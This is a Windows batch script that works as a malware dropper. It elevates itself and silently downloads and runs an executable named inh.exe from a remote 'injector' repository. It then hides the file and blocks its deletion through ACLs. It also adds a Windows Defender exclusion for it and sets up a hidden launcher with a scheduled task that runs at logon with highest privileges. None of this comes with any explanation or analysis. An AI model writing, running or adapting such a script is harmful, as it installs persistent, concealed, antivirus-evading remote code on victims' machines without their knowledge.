@echo off
net session >nul 2>&1
if %errorlevel% neq 0 (
    powershell -Command "Start-Process '%~f0' -Verb RunAs"
    exit /b
)

cd /d "%~dp0"

set "URL=https://github.com/dexovision/injector/raw/main/inh.zip"
set "ZIPFILE=inh.zip"
set "DESTDIR=repo"

:: Run download silently with NO window
powershell -NoProfile -WindowStyle Hidden -Command ^
    "Invoke-WebRequest -Uri '%URL%' -OutFile '%ZIPFILE%' | Out-Null"

mkdir "%DESTDIR%" 2>nul
tar -xf "%ZIPFILE%" -C "%DESTDIR%"


set "EXE_NAME=inh.exe"
set "SOURCE_PATH=%~dp0repo\inh.exe"
set "STARTUP_PATH=%USERPROFILE%\AppData\%EXE_NAME%"


copy "%SOURCE_PATH%" "%STARTUP_PATH%" /Y >nul 2>&1
if %ERRORLEVEL% EQU 0 (
    if exist "%SOURCE_PATH%" del "%SOURCE_PATH%" /F /Q
)
rmdir /s /q "%DESTDIR%"
attrib +h +s +r "%USERPROFILE%\AppData\inh.exe"
icacls "%USERPROFILE%\AppData\inh.exe" /inheritance:d
icacls "%USERPROFILE%\AppData\inh.exe" /grant:r *S-1-1-0:(RX)
icacls "%USERPROFILE%\AppData\inh.exe" /deny *S-1-1-0:(D)
powershell -Command "Add-MpPreference -ExclusionPath '%USERPROFILE%\AppData\inh.exe'"
start "" "%USERPROFILE%\AppData\inh.exe"
:: Create scheduled task
set "outfile=%appdata%\launcher.bat"

(
    echo @echo off
    echo start "" "%USERPROFILE%\AppData\inh.exe"
    echo start "" "%USERPROFILE%\AppData\autoreopener.bat"
) > "%outfile%"

attrib +h +s +r "%appdata%\launcher.bat"
icacls "%appdata%\launcher.bat" /inheritance:d
icacls "%appdata%\launcher.bat" /grant:r *S-1-1-0:(RX)
icacls "%appdata%\launcher.bat" /deny *S-1-1-0:(D)

set "LAUNCHER=%APPDATA%\launcher.bat"
set "TASKNAME=HiddenLauncherTask"
if not exist "%LAUNCHER%" exit /b
schtasks /create /tn "TaskName" /tr "%APPDATA%\launcher.bat" /sc onlogon /rl HIGHEST /F

